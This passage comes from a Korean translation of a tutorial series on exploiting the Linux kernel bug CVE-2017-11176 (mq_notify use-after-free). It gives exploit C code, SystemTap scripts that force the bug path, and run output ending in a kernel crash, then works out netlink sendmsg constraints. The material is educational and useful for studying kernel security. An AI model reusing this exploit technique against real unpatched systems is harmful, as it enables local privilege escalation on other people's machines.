      // initialize the unblock thread arguments, and launch it
      memset(&uta, 0, sizeof(uta));
      uta.fd = sock_fd;
      uta.is_ready = false;
      printf("creating unblock thread...\n");
      if ((errno = pthread_create(&tid, NULL, unblock_thread, &uta)) != 0)
      {
        perror("pthread_create");
        goto fail;
      }
      while (uta.is_ready == false) // spinlock until thread is created
        ;
      printf("unblocking thread has been created!\n");

      printf("get ready to block\n");
      if (_mq_notify((mqd_t)-1, &sigev))
      {
        perror("mq_notify");
        goto fail;
      }
      printf("mq_notify succeed\n");

      // ... cut ...
    }
```

여기서 "sleep(5)"를 호출하고 "uta->is\_ready"로 무언가 한 것을 알 수 있다. 설명해주도록 하겠다.

**pthread\_create()**를 호출하는 것은 스레드를 생성하고 가동(launch)하는 것을 요청하는 것이다. task를 생성한다고 해서 task가 바로 실행되는 것은 아니다. 스레드가 실행되었다는 것을 확실히 하기 위해 **spinlock**: uta->is\_ready를 이용한다.

**노트**: spinlock은 (실제) locking의 가장 간단한 형태이다. 기본적으로 변수의 상태가 바뀔 때까지 루프를 도는데 그동안 CPU가 99% 사용되기 때문에 "유효"(active)하다고 할 수 있다. 원자같은(atomic-like) 변수를 사용하는 것은 쓰는 자와 읽는 자가 하나씩밖에 없기 때문에 여기서 요구되진 않는다(?).

**주의**: 다음 섹션에서 "unlock" (spinlock)과 "unblock" (깨우는 것)을 헷갈리지 말자!

unblock\_thread가 unlock ('is\_ready를 true로 설정)해줄 때까지 메인 스레드는 루프에 갇혀있다. pthred의 barrier를 통해서도 (항상 가능한 것은 아니지만) 같은 결과를 얻을 수 있다. 여기서 spinlock을 하는 것은 부가적인 것이며, 그저 스레드 생성을 통해 "더 통제를 잘" 할 수 있도록 해줄 뿐이다. 다른 이유는 task 생성에서 메모리 할당이 많이 일어나 일반적으로 익스플로잇을 방해하기 때문이다. 마지막으로 매우 유사한 테크닉이 [part 3](https://chamalane.herokuapp.com/posts/5d503601c040080004228197)에서 필요하기 때문에 여기서 소개하지 않는 것이다.

반대로 pthread\_create() 이후 메인 스레드가 오랫동안 순서에서 밀렸다(= 실행되지 않는다)고(preempted) 가정해보자. 그럼 다음과 같은 순서로 흘러갈 것이다.

```plaintext
Thread-1          | Thread-2
------------------+---------------------------
                  |
pthread_create()  |
                  | <<< new task created >>>
<<< preempted >>> |
                  | <<< thread starts >>>
<<< still...      |
 ...preempted >>> | setsockopt() -> succeed
                  |
mq_notify()       |
=> start BLOCKING |
```

이 시나리오에서 mq\_notify가 block하기 전에 "setsockopt()"가 호출되기 때문에 메인 스레드를 unblock해주지 **않을 것**이다. 이것이 메인 스레드를 unblock한 이후 **sleep(5)**가 있던 이유이다('is\_ready'는 true이다).  다시 말해 "그저" mq\_notify()를 호출하는 데 적어도 5초가 걸린다는 것이다. "5초"가 충분하다는 것을 다음과 같은 이유로 믿을 수 있다:

* 메인 스레드가 5초 뒤에도 순서에서 밀려(preempted) 있다면 타겟 시스템에 부하가 심하게 걸려있는 것이므로 어차피 익스플로잇을 실행하면 안 된다.
* 만약 unblock\_thread가 메인 스레드와 "경합"(race)하면 CTRL+C 명령어를 이용할 수 있다. 그러면 netlink\_attachskb()가 "-ERESTARTSYS"를 반환하고 그 경로에선 버그가 트리거되지 않는다. 그럼 익스플로잇을 재실행하면 된다.

다시 말해 "제어되는 기회"의 시간은 이제 5초이다. 메인 스레드가 실행 중이 아니기 때문에 다른 스레드를 깨울 수 없다는 점이 마음에 들지 않을 수 있다(Core Concepts #2 참고). unblock\_thread가 모종의 방법으로 정보를 얻어내는 것일까? 뭐...여기선 sleep(5)를 사용하는 것으로 충분하다😊.

## <a name='updating-the-stap-script'></a>Updating the STAP Script

익스플로잇을 실행하기 전에 stap 스크립트를 수정해야 한다. 이제 netlink\_attachskb()를 호출하기 **전에** netlink\_socket (fd=3)을 제거한다. 이는 setsockopt()를 netlink\_attachskb() 진입 후에 호출하면 file descriptor *sock\_fd* 가 인식 불가능(invalid)해질 것이기 때문이다(FDT의 NULL을 가리킨다). 즉 setsockopt()가 "Bad File Descriptor" 에러로 실패할 것이다(= *netlink\_setsockopt()* 엔 도달조차 못함).

그러므로 netlink\_attachskb() 이전이 아닌 리턴할 때 fd "3"을 제거하자:

```stap
# mq_notify_force_crash.stp
#
# Run it with "stap -v -g ./mq_notify_force_crash.stp" (guru mode)

%{
#include <net/sock.h>
#include <net/netlink_sock.h>
#include <linux/fdtable.h>
%}

function force_trigger_before:long (arg_sock:long)
%{
  struct sock *sk = (void*) STAP_ARG_arg_sock;
  struct netlink_sock *nlk = (void*) sk;
  nlk->state |= 1;   // enter the netlink_attachskb() retry path    

  // NOTE: We do not mark the sock as DEAD anymore
%}

function force_trigger_after:long (arg_sock:long)
%{
  struct files_struct *files = current->files;
  struct fdtable *fdt = files_fdtable(files);
  fdt->fd[3] = NULL; // makes the second call to fget() fails
%}


probe kernel.function ("netlink_attachskb")
{
  if (execname() == "exploit")
  {
    force_trigger_before($sk);
  }
}

probe kernel.function ("netlink_attachskb").return
{
  if (execname() == "exploit")
  {
    force_trigger_after(0);
  }
}
```

늘 그랬던 것처럼 probe를 좀 더 추가하여 코드 흐름을 볼 수 있도록 하자. 그럼 다음과 같은 결과를 얻는다:

```bash
$ ./exploit 
-={ CVE-2017-11176 Exploit }=-
netlink socket created = 3
creating unblock thread...
unblocking thread has been created!
get ready to block

<<< we get stuck here during ~5secs >>>

[unblock] unblocking now
mq_notify: Bad file descriptor
exploit failed!

(15981-15981) [SYSCALL] ==>> mq_notify (-1, 0x7fffbd130e30)
(15981-15981) [uland] ==>> copy_from_user ()
(15981-15981) [skb] ==>> alloc_skb (priority=0xd0 size=0x20)
(15981-15981) [uland] ==>> copy_from_user ()
(15981-15981) [skb] ==>> skb_put (skb=0xffff8800302551c0 len=0x20)
(15981-15981) [skb] <<== skb_put = ffff88000a015600
(15981-15981) [vfs] ==>> fget (fd=0x3)
(15981-15981) [vfs] <<== fget = ffff8800314869c0
(15981-15981) [netlink] ==>> netlink_getsockbyfilp (filp=0xffff8800314869c0)
(15981-15981) [netlink] <<== netlink_getsockbyfilp = ffff8800300ef800
(15981-15981) [netlink] ==>> netlink_attachskb (sk=0xffff8800300ef800 skb=0xffff8800302551c0 timeo=0xffff88000b157f40 ssk=0x0)
(15981-15981) [sched] ==>> schedule_timeout (timeout=0x7fffffffffffffff)
(15981-15981) [sched] ==>> schedule ()
(15981-15981) [sched] ==>> deactivate_task (rq=0xffff880003c1f3c0 p=0xffff880031512200 flags=0x1)
(15981-15981) [sched] <<== deactivate_task = 

<<< we get stuck here during ~5secs >>>

(15981-15981) [sched] <<== schedule = 
(15981-15981) [sched] <<== schedule_timeout = 7fffffffffffffff
(15981-15981) [netlink] <<== netlink_attachskb = 1              // <----- returned 1
(15981-15981) [vfs] ==>> fget (fd=0x3)
(15981-15981) [vfs] <<== fget = 0                               // <----- returned 0
(15981-15981) [netlink] ==>> netlink_detachskb (sk=0xffff8800300ef800 skb=0xffff8800302551c0)
(15981-15981) [netlink] <<== netlink_detachskb
(15981-15981) [SYSCALL] <<== mq_notify= -9
```

**노트**: 다른 스레드의 trace는 결과를 명확히 보여주기 위해 제거되었다.

완벽하다! 메인 스레드가 netlink\_attachskb() 안에서 5초간 멈춰 있었고, 다른 스레드를 통해 unblock하였더니 (예상대로) 1을 반환했다!

이번 섹션에서 어떻게 race를 제어하고 기회를 무한정 확장하는지(우리는 5초로 줄였다) 보았다. 그리고 setsockopt()를 이용하여 메인 스레드를 깨우는 법을 보았다. 또한 익스플로잇에서 발생할 수 있는 "race"에 대해 다루고 간단한 방법으로 발생 가능성을 줄이는 방법을 보았다. 마지막으로, 유저 영역의 코드만 이용하여 stap 스크립트로 해결했던 요구 조건(SOCK을 dead로 마킹하는 것) 중 하나를 제거했다. 아직 두 요구 조건을 더 구현해야 한다.

- - -

# <a name='making-fget-fail-on-second-loop'></a>Making *fget()* Fail on Second Loop

지금까지 세 가지 요구 조건 중 하나를 유저 영역에서 구현했다. 앞으로 할 일들의 목록이다:

1. **netlink\_attachskb()가 1을 반환하게 만들기**
2. [해결] 익스플로잇 스레드 unblock하기
3. **두 번째 fget() 호출이 NULL을 반환하게 만들기**

이번 섹션에서 두 번째 fget() 호출이 NULL을 반환하게 만들 것이다. 그렇게 하면 두 번째 루프에서 "exit path"로 진입할 수 있다:

```c
retry:
            filp = fget(notification.sigev_signo);
            if (!filp) {
                ret = -EBADF;
                goto out;           // <--------- on the second loop only!
            }
```

## 왜 fget()이 NULL을 반환할까?

System Tap을 통해 FDT에 있는 우리의 타겟 file descriptor의 항목을 리셋하는 것만으로 fget()이 실패하도록(= NULL을 반환하도록) 만들 수 있다는 걸 보았다:

```stap
struct files_struct *files = current->files;
struct fdtable *fdt = files_fdtable(files);
fdt->fd[3] = NULL; // makes the second call to fget() fails
```

**fget()**은 다음 일들을 한다:

1. *현재* 프로세스의 "struct files\_struct"를 얻는다.
2. files\_struct의 "struct fdtable"를 얻는다.
3. "fdt->fd[fd]" ("struct file" 포인터) 값을 얻는다.
4. "struct file"의 레퍼런스 카운터를 (NULL이 아니라면) 1 증가시킨다.
5. "struct file" 포인터를 반환한다.

요약하면 특정 file descriptor에 대한 FDT 항목이 NULL이면 fget()이 NULL을 반환한다.

**노트**: 여기서 언급된 구조체들 사이의 관계가 기억이 안 난다면 [핵심 개념 #1](https://chamalane.herokuapp.com/posts/5d4ef9fb907a8600042c4cca#core-concepts)를 다시 보고 오자.

## Reset an Entry in the File Descriptor Table

stap 스크립트에서 file descriptor에 대한 fdt 항목을 "3"으로 재설정했었다(이전 섹션 참고). 유저 영역에선 어떻게 해야 될까? FDT 항목을 NULL로 설정해주는 것은 무엇인가? **정답은 close() syscall이다.**

다음은 locking과 error handling이 없는 단순화된 버전이다:

```c
    // [fs/open.c]

    SYSCALL_DEFINE1(close, unsigned int, fd)
    {
      struct file * filp;
      struct files_struct *files = current->files;
      struct fdtable *fdt;
      int retval;

[0]   fdt = files_fdtable(files);
[1]   filp = fdt->fd[fd];
[2]   rcu_assign_pointer(fdt->fd[fd], NULL); // <----- equivalent to: fdt->fd[fd] = NULL
[3]   retval = filp_close(filp, files);
      return retval;
    }
```

close() syscall은 다음과 같은 일을 한다:

* [0] - 현재 프로세스의 FDT를 얻는다
* [1] - FDT를 이용하여 fd와 연관된 struct file의 포인터를 얻는다
* [2] - **(무조건적으로) FDT 항목을 NULL로 재설정한다**
* [3] - file object에 대한 참조를 해제한다(= fput() 호출)

그럼 이제 (무조건적으로) FDT 항목을 재설정할 방법이 생겼다. 그런데 이렇게 하면 다른 문제가 생긴다

## An Egg and Chicken Issue...

*그냥* *unblock\_thread* 에서 setsockopt() 호출 전에 close()를 호출하면 안 되나? 문제는 setsockopt()에 유효한 file descriptor가 필요하다는 것이다. 우린 그걸 system tap을 통해 [이미 경험](https://chamalane.herokuapp.com/posts/5d5035f8c040080004228196#updating-the-stap-script)했고, 그때문에 "fdt reset code"를 netlink\_attachskb()가 리턴(하기 전이 아니고)할 때 옮겼다. 유저 영역에서도 동일한 문제가 있다.

setsockopt() (스레드 unblock) *이후에* close()를 호출하면 어떨까? 그렇게 하면 **크게 만든 기회를 이용할 수가 없다**. 다시 말해 "작은 기회"로 다시 돌아간다. 그럴 수는 없다.

다행히도 방법이 존재한다! [핵심 개념 #1](https://chamalane.herokuapp.com/posts/5d4ef9fb907a8600042c4cca#core-concepts)에서 file descriptor table이 **1대1 매핑이 아니**라고 했었다. 즉 여러 file descriptor가 한 file 오브젝트를 가리키고 있을 수 있다는 뜻이다. 두 file descriptor 한 struct file을 가리키게 하려면 어떻게 해야 할까? **dup() syscall**을 이용하는 것이다.

```c
    // [fs/fcntl.c]

    SYSCALL_DEFINE1(dup, unsigned int, fildes)
    {
      int ret = -EBADF;
[0]   struct file *file = fget(fildes);

      if (file) {
[1]     ret = get_unused_fd();
        if (ret >= 0)
[2]       fd_install(ret, file); // <----- equivalent to: current->files->fdt->fd[ret] = file
        else
          fput(file);
      }
[3]   return ret;
    }
```

dup() syscall은 정확히 우리가 원하는 것을 해준다:

* [0] - file descriptor가 struct file 오브젝트를 참조한다.
* [1] - 다음 "쓰이지 않은/사용 가능한" file descriptor를 고른다.
* [2] - 이 새로운 file descriptor의 fdt 항목을 struct file 오브젝트에 대한 포인터로 설정한다.
* [3] - 새 fd를 반환한다.

결국 동일한 struct file을 가리키는 두 file descriptor가 생기게 된다:

* **sock\_fd**: mq\_notify()와 close()에 의해 사용됨
* **unblock\_fd**: setsockopt()에 의해 사용됨

## Updating the Exploit

close/dup 호출을 추가하고 setsockopt()의 파라미터를 바꿔 익스플로잇을 업데이트해보자:

```c
struct unblock_thread_arg
{
  int sock_fd;
  int unblock_fd;     // <----- used by the "unblock_thread"
  bool is_ready;
};

static void* unblock_thread(void *arg)
{
  // ... cut ...

  sleep(5); // gives some time for the main thread to block

  printf("[unblock] closing %d fd\n", uta->sock_fd);
  _close(uta->sock_fd);                               // <----- close() before setsockopt()

  printf("[unblock] unblocking now\n");
  if (_setsockopt(uta->unblock_fd, SOL_NETLINK,       // <----- use "unblock_fd" now!
                  NETLINK_NO_ENOBUFS, &val, sizeof(val)))
    perror("setsockopt");
  return NULL;
}

int main(void)
{
  // ... cut ...

  if ((uta.unblock_fd = _dup(uta.sock_fd)) < 0)         // <----- dup() after socket() 
  {
    perror("dup");
    goto fail;
  }
  printf("[main] netlink fd duplicated = %d\n", uta.unblock_fd);

  // ... cut ...
}
```

stap 스크립트에서 FDT 재설정하는 부분을 없애고 실행해보자:

```plaintext
-={ CVE-2017-11176 Exploit }=-
[main] netlink socket created = 3
[main] netlink fd duplicated = 4
[main] creating unblock thread...
[main] unblocking thread has been created!
[main] get ready to block
[unblock] closing 3 fd
[unblock] unblocking now
mq_notify: Bad file descriptor
exploit failed!

<<< KERNEL CRASH >>>
```

**ALERT COBRA(?): 첫 커널 크래시가 발생했다! use-after-tree를 트리거한 것이다.**

크래시의 이유는 [part 3](https://chamalane.herokuapp.com/posts/5d503601c040080004228197)에서 배울 것이다.

*간단히 요약하자면 다음과 같다. dup() 때문에 close()를 호출해도 netlink\_sock 오브젝트에 대한 참조가 해제되지 않을 것이다. netlink\_sock에 마지막으로 한 참조는 사실 netlink\_detachskb()에서 해제된다(그리고 netlink\_sock은 free된다). 결국 use-after-free는 프로그램이 종료될 때 "unblock\_fd" file descriptor를 (netlink\_release()를 통해) 해제하며 트리거된다.*

좋다! 벌써 조건 둘을 System Tap **없이** 해결했다. 그럼 다음으로 넘어가서 마지막 조건을 구현해보자.

- - -

# <a name='looping-back-to-retry-label'></a>"retry" label로 돌아가기

이 섹션은 *끔찍한* 커널 코드 살펴보기처럼 보일 수 있다. 겁먹지 말자! 완전한 proof-of-concept 코드까지 한 걸음 남았다. "*쇠뿔도 단김에 빼라*" 는 말이 있다.

그럼 이제 할 일 목록을 보자:

1. **netlink\_attachskb()가 1을 반환하게 만들기**
2. [해결] 익스플로잇 스레드 unblock하기
3. [해결] 두 번째 fget() 호출이 NULL을 반환하게 만들기

**retry path**에 도달하려면 **netlink\_attachskb()**가 1을 반환해야 한다. 그렇게 하려면 첫 번째 조건을 통과하고 스레드를 unblock해야 한다(이미 했다(?)).

```c
    int netlink_attachskb(struct sock *sk, struct sk_buff *skb,
              long *timeo, struct sock *ssk)
    {
      struct netlink_sock *nlk;
      nlk = nlk_sk(sk);

[0]   if (atomic_read(&sk->sk_rmem_alloc) > sk->sk_rcvbuf || test_bit(0, &nlk->state))
      {
        // ... cut ...
        return 1;
      }
      // normal path
      return 0;
    }
```

조건 [0]은 다음 경우에 true이다:

1. **sk\_rmem\_alloc** 값이 **sk\_rcvbuf** 보다 *큰 경우*. 혹은...
2. ...**nlk->state**의 최하위 비트가 설정되어 있는 경우

지금은 stap을 이용하여 "nlk->state"의 최하위 비트를 설정해주고 있다:

```stap
struct sock *sk = (void*) STAP_ARG_arg_sock;
struct netlink_sock *nlk = (void*) sk;
nlk->state |= 1;    
```

그러나 소켓 상태를 "congested"(최하위 비트가 설정된 것)하다고 해놓는 것은 약간 시시하다. 최하위 비트를 설정해주는 커널 경로는 메모리 할당 실패로만 도달할 수 있다. 그렇게 되면 시스템이 불안정한 상태가 되어 익스플로잇을 하기에 적합하지 않게 된다. 물론 (메모리 실패가 없는) 다른 경로가 있지만 이미 만족시킨 조건이 쓸모가 없어져버린다.

그 대신에 sock의 receive buffer의 "현재" 크기를 나타내는 **sk\_rmem\_alloc** 값을 증가시켜볼 것이다.

## Filling The Receive Buffer

이번 섹션에서 만족시키려는 조건은 "receive buffer가 꽉 찼는가?"와 같다:

```
atomic_read(&sk->sk_rmem_alloc) > sk->sk_rcvbuf
```

struct sock(netlink\_sock에 내장됨)이 다음 네 가지 필드를 가지고 있었던 것을 상기해보자:

* **sk\_rcvbuf**: receive buffer의 "이론적인" 최대 크기 (byte 단위)
* **sk\_rmem\_alloc**: receive buffer의 "현재" 크기 (byte 단위)
* **sk\_receive\_queue**: "skb"의 이중 연결 리스트(= 네트워크 버퍼)

**노트**: sk\_rcvbuf는 "이론적인" 크기인데, 그것은 receive buffer의 "현재" 크기가 sk\_rcvbuf를 넘을 수 있기 때문이다.

stap으로 netlink sock 구조체를 덤프할 때 ([part 1](http://chamalane.herokuapp.com/posts/5d4ef9fb907a8600042c4cca)) 다음 내용이 있었다:

```plaintext
- sk->sk_rmem_alloc = 0
- sk->sk_rcvbuf = 133120
```

이 조건을 만족시키는 방법이 두 가지 있다:

1. sk\_rcvbuf를 0보다 작게 만든다. (우리 커널 버전에서 sk\_rcvbuf의 타입은 *int*이다)
2. sk\_rmem\_alloc을 133120보다 크게 만든다.

## Lowering sk\_rcvbuf

*sk\_rcvbuf*는 모든 sock 오브젝트에서 일반적인 것이다. 이 값이 (netlink socket들과) 변하는 곳은 많지 않다. 그 중 하나가 (SOL\_SOCKET 파라미터로 접근 가능한) **sock\_setsockopt**이다:

```c
    // from [net/core/sock.c]

    int sock_setsockopt(struct socket *sock, int level, int optname,
            char __user *optval, unsigned int optlen)
    {
      struct sock *sk = sock->sk;
      int val;

      // ... cut  ...

      case SO_RCVBUF:
[0]     if (val > sysctl_rmem_max)
          val = sysctl_rmem_max;
    set_rcvbuf:
        sk->sk_userlocks |= SOCK_RCVBUF_LOCK;
[1]     if ((val * 2) < SOCK_MIN_RCVBUF)
          sk->sk_rcvbuf = SOCK_MIN_RCVBUF;          
        else  
          sk->sk_rcvbuf = val * 2;                 
        break;

      // ... cut (other options handling) ...
    }
```

이런 종류의 코드를 보면 **모든 식의 타입(expression type)을 유심히 봐야 한다**.

**노트**: "signed/unsigned 타입 혼합"때문에 많은 버그가 존재한다. 큰 타입(u64)를 작은 타입(u32)로 변환할 때도 마찬가지다. 이 경우 종종 *int overflow* 나 *형 변환* 문제로 이어진다.

우리의 타겟(제시된 타겟과는 다를 수 있음)엔 다음과 같은 식 타입이 있다:

* **sk\_rcvbuf**: int
* **val**: int
* **sysctl\_rmem\_max**: \_\_u32
* **SOCK\_MIN\_RCVBUF**: "sizeof()" 때문에 size\_t로 "promote"됨

SOCK\_MIN\_RCVBUF는 다음처럼 define된다:

```c
#define SOCK_MIN_RCVBUF (2048 + sizeof(struct sk_buff))
```

일반적으로 *singed* integer와 *unsigned* integer를 혼합하면 *singed* integer가 unsigned 타입으로 변환된다.

**주의**: 이 규칙이 항상 성립한다곤 생각하지 말자. 컴파일러가 다른 방식을 사용할 수도 있다. 확실하게 하려면 디스어셈블리 코드를 확인해봐야 한다.

"val"에 *음*의 값을 줬다고 생각해보자. [0]에서 (**sysctl\_rmem\_max**의 타입이 "\_\_u32"이므로) val은 unsigned 타입으로 promote된다. 그리고 값이 *sysctl\_rmem\_max*로 재설정될 것이다(작은 음의 값은 큰 unsigned 값이다).

"val"이 "\_\_u32"로 promote되지 않더라도 두 번째 검사 [1]는 통과하지 못 할 것이고, 결국 [SOCK\_MIN\_RCVBUF, sysctl\_rmem\_max] (= 음수가 아님)에 고정될 것이다. 즉 **sk\_rcvbuf** 필드 대신 **sk\_rmem\_alloc** 필드를 이용해야 한다.

**노트**: 익스플로잇을 개발할 때 실제로 *아무 데도* 가지 않는 많은 코드 경로를 분석하게 된다. 이 문서에서 그런 현상을 보여주고 싶었다.

## Back to the "normal" path

이 시리즈의 극초반부에 무시하고 지나갔던 mq\_notify의 "정상" 경로에 대해 다시 다룰 때가 되었다. 개념상으로, **정상 경로가 receive buffer를 실제로 채울 것**이기 때문에 receive buffer가 가득 찰 때 진입하는 "retry 경로"가 존재하는 것이다.

netlink\_attachskb()를 보면 다음과 같다:

```c
    int netlink_attachskb(struct sock *sk, struct sk_buff *skb,
              long *timeo, struct sock *ssk)
    {
      struct netlink_sock *nlk;
      nlk = nlk_sk(sk);
      if (atomic_read(&sk->sk_rmem_alloc) > sk->sk_rcvbuf || test_bit(0, &nlk->state)) {
          // ... cut (retry path) ...
      }
      skb_set_owner_r(skb, sk);       // <----- what about this ?
      return 0;
    }
```

즉 *normal path* 는 **skb\_set\_owner\_r()**을 호출한다:

```c
    static inline void skb_set_owner_r(struct sk_buff *skb, struct sock *sk)
    {
      WARN_ON(skb->destructor);
      __skb_orphan(skb);
      skb->sk = sk;
      skb->destructor = sock_rfree;
[0]   atomic_add(skb->truesize, &sk->sk_rmem_alloc);  // sk->sk_rmem_alloc += skb->truesize
      sk_mem_charge(sk, skb->truesize);
    }
```

**skb\_set\_owner\_r()이 *skb->truesize*를 통해 *sk\_rmem\_alloc* 값을 증가시킨다**. 그럼 receive buffer가 꽉 찰 때까지 mq\_notify()를 계속 호출해야 할까? 안타깝게도 그게 그리 쉬운 일이 아니다.

mq\_notify()의 정상적인 흐름 초반에 ("cookie"라 불리는) skb가 생성되고 netlink\_attachskb()를 통해 netlink\_sock에 첨부(attach)된다. 이 내용은 이미 다뤘다. 그러고 나서 netlink\_sock과 skb는 message queue에 속한 "mqueue\_inode\_info"에 연동(associate)된다(mq\_notify의 정상 경로 참고). 

**문제는 mqueue\_inode\_info 구조체에 연동될 수 있는 (cookie) "skb" 동시에 하나뿐이라는 것이다**. 즉 mq\_notify()를 두 번 호출하면 "-EBUSY" 에러와 함께 실패하게 된다. 다시 말해 **sk\_rmem\_alloc**의 크기를 (주어진 message queue에 대해) 한 번밖에 증가시킬 수 없고 이는 sk\_rcvbuf보다 커지기에 충분하지 않다.

어쩌면 여러 message queue를 만들어 여러 mqueue\_inode\_info 오브젝트를 만들고 mq\_notify()를 여러 번 호출할 수도 있다. 아니면 mq\_timedsend() syscall을 이용하여 queue에 message들을 넣을 수도 있다. 하지만 다른 하위 시스템(mqueue)를 공부해야 하고, "일반적인" 커널 경로(sendmsg)를 이용하기 위해서 이 방법들을 시도하진 않을 것이다. 해보면 좋은 연습이 된다.

**노트**: 익스플로잇 코드 작성엔 항상 여러 방법이 있다.

## The netlink\_unicast() path

skb\_set\_owner\_r()의 도움으로 netlink\_attachskb()가 sk\_rmem\_alloc 값을 올릴 수 있다는 것을 보았다. netlink\_attachskb() 함수는 **netlink\_unicast()**에 의해 호출된다. 어떻게 netlink\_unicast()에 도달할 수 있는지 확인하기 위한 *bottom-up*  분석을 해보자:

```plaintext
- skb_set_owner_r
- netlink_attachskb
- netlink_unicast   
- netlink_sendmsg   // there is a lots of "other" callers of netlink_unicast
- sock->ops->sendmsg()          
- __sock_sendmsg_nosec()
- __sock_sendmsg()
- sock_sendmsg()
- __sys_sendmsg()
- SYSCALL_DEFINE3(sendmsg, ...)
```

**netlink\_sendmsg()**가 netlink socket의 *proto\_ops*이기 때문에 ([핵심 개념 #1](https://chamalane.herokuapp.com/posts/5d4ef9fb907a8600042c4cca#core-concepts)), sendmsg() syscall을 통해 도달할 수 있다.

sendmsg() syscall에서 sendmsg의 proto\_ops로 가능 generic한 코드 경로는 (sock->ops->sendmsg()) [part 3](https://chamalane.herokuapp.com/posts/5d503601c040080004228197)에서 더 자세히 다룬다. 당장은 별 문제 없이 netlink\_sendmsg()에 도달할 수 있다고 가정하자.

## Reaching netlink\_unicast() from netlink\_sendmsg()

sendmsg() syscall은 다음과 같은  서명(signature)을 가지고 있다:

```c
ssize_t sendmsg(int sockfd, const struct msghdr *msg, int flags);
```

netlink\_unicast()에 도달하는 건 *msg*와 *flags* 둘 다의 *right values*와 관련이 있다:

```c
  struct msghdr {
     void         *msg_name;       /* optional address */
     socklen_t     msg_namelen;    /* size of address */
     struct iovec *msg_iov;        /* scatter/gather array */
     size_t        msg_iovlen;     /* # elements in msg_iov */
     void         *msg_control;    /* ancillary data, see below */
     size_t        msg_controllen; /* ancillary data buffer len */
     int           msg_flags;      /* flags on received message */
  };

  struct iovec
  {
    void __user     *iov_base;
    __kernel_size_t iov_len;
  };
```

이 섹션에선 **코드로부터 파라미터의 값을 추론하고 우리의 "제약" 목록을 단계별로 설정할 것이다**. 그렇게 하면 커널이 *우리*가 원하는 경로로 가게 된다. 여기서 netlink\_unicast() 호출은 함수의 제일 끝부분에 있다. 모든 검사를 통과(하거나 스킵)해야 할 것이다.

시작해보자:

```c
    static int netlink_sendmsg(struct kiocb *kiocb, struct socket *sock,
             struct msghdr *msg, size_t len)
    {
      struct sock_iocb *siocb = kiocb_to_siocb(kiocb);
      struct sock *sk = sock->sk;
      struct netlink_sock *nlk = nlk_sk(sk);
      struct sockaddr_nl *addr = msg->msg_name;
      u32 dst_pid;
      u32 dst_group;
      struct sk_buff *skb;
      int err;
      struct scm_cookie scm;
      u32 netlink_skb_flags = 0;

[0]   if (msg->msg_flags&MSG_OOB)
        return -EOPNOTSUPP;

[1]   if (NULL == siocb->scm)
        siocb->scm = &scm;

      err = scm_send(sock, msg, siocb->scm, true);
[2]   if (err < 0)
        return err;

      // ... cut ...

      err = netlink_unicast(sk, skb, dst_pid, msg->msg_flags&MSG_DONTWAIT);   // <---- our target

    out:
      scm_destroy(siocb->scm);
      return err;
    }
```

*MSG\_OOB* 플래그가 설정되어 있으면 통과할 수 없다 [0]. 여기서 첫 번째 제약이 나온다: **msg->msg\_flags MSG\_OOB 비트가 설정되어 있지 않을 것**

[1]에서의 검사는 "siocb->scm"이 **\_\_sock\_sendmsg\_nosec()**에서 NULL로 설정되기 때문에 true일 것이다. 최종적으로 *scm\_send()*가 음의 값을 반환하면 안 된다 [2]. 코드는 다음과 같다:

```c
static __inline__ int scm_send(struct socket *sock, struct msghdr *msg,
                   struct scm_cookie *scm, bool forcecreds)
{
    memset(scm, 0, sizeof(*scm));
    if (forcecreds)
        scm_set_cred(scm, task_tgid(current), current_cred());
    unix_get_peersec_dgram(sock, scm);
    if (msg->msg_controllen <= 0)     // <----- this need to be true...
        return 0;                     // <----- ...so we hit this and skip __scm_send()
    return __scm_send(sock, msg, scm);
}
```

두 번째 제약은 **msg->msg\_controllen이 0이어야 한다**는 것이다. msg->msg\_controllen의 타입은 size\_t이고 음의 값이 아니다.

netlink\_sendmsg()의 내용을 이어서 보자:

```c
      // ... netlink_sendmsg() continuation ...

[0]   if (msg->msg_namelen) {
        err = -EINVAL;
[1]     if (addr->nl_family != AF_NETLINK)
          goto out;
[2a]    dst_pid = addr->nl_pid;
[2b]    dst_group = ffs(addr->nl_groups);
        err =  -EPERM;
[3]     if ((dst_group || dst_pid) && !netlink_allowed(sock, NL_NONROOT_SEND))
          goto out;
        netlink_skb_flags |= NETLINK_SKB_DST;
      } else {
        dst_pid = nlk->dst_pid;
        dst_group = nlk->dst_group;
      }

      // ... cut ...
```

약간 까다롭다. 이 block은 "송신자" 소켓이 목적지(수신자) 소켓에 이미 연결되어 있는지 아닌지에 따라 달려있다. 만약 연결되어 있으면 "nlk->dst\_pid"와 "nlk->dst\_group"은 이미 설정되어 있다. 수신자 소켓에 연결되면 좋지 않은 부작용이 발생할 수 있어서 첫 선택지(branch)로 가는 것이 좋다. 즉 **msg->msg\_namelen이 무조건 0이 아니어야 한다** [0].

함수의 시작 부분을 다시 보면 "addr"이 유저가 컨트롤할 수 있는 또 다른 파라미터(msg->msg\_name)인 것을 알 수 있다. [2a]와 [2b]의 도움으로 임의적인 "dst\_group"과 "dst\_pid"를 선택할 수 있다. 이 둘을 제어하면 다음과 같은 일을 할 수 있다:

1. dst\_group == 0: broadcast message가 아닌 unicast message를 보낼 수 있다.
2. dst\_pid != 0: 수신자 소켓(유저 영역)에 선택을 전달할 수 있다. 0은 "커널에게 전달"을 의미한다(매뉴얼을 읽어보자!).

제약 목록에서 우리가 변환하는 것은 다음 것들이다(msg\_name은 sockaddr\_nl로 형 변환된다):

1. **msg->msg\_name->dst\_group이 0**
2. **msg->msg\_name->dst\_pid가 "목적지" 소켓의 nl\_pid와 같음**

그러나 이는 **netlink\_allowed(sock, NL\_NONROOT\_SEND)** [3]가 0을 반환하지 않는 것을 의미한다:

```c
static inline int netlink_allowed(const struct socket *sock, unsigned int flag)
{
  return (nl_table[sock->sk->sk_protocol].flags & flag) || capable(CAP_NET_ADMIN));
}
```

unprivileged 사용자에서 익스플로잇을 하는 관계로 CAP\_NET\_ADMIN이 없다. "NL\_NONROOT\_SEND" 플래그가 설정된 유일한 "netlink protocol"은 *NETLINK\_USERSOCK*이다(교차 참조(cross-reference)하라). 즉 **"sender" 소켓이 무조건 NETLINK\_USERSOCK 프로토콜을 가지고 있어야 한다**.

추가로 [1]에서 **msg->msg\_name->nl\_family가 AF\_NETLINK와 같아야** 한다.

다음 내용을 보자:

```c
[0]   if (!nlk->pid) {
[1]     err = netlink_autobind(sock);
        if (err)
          goto out;
      }
```

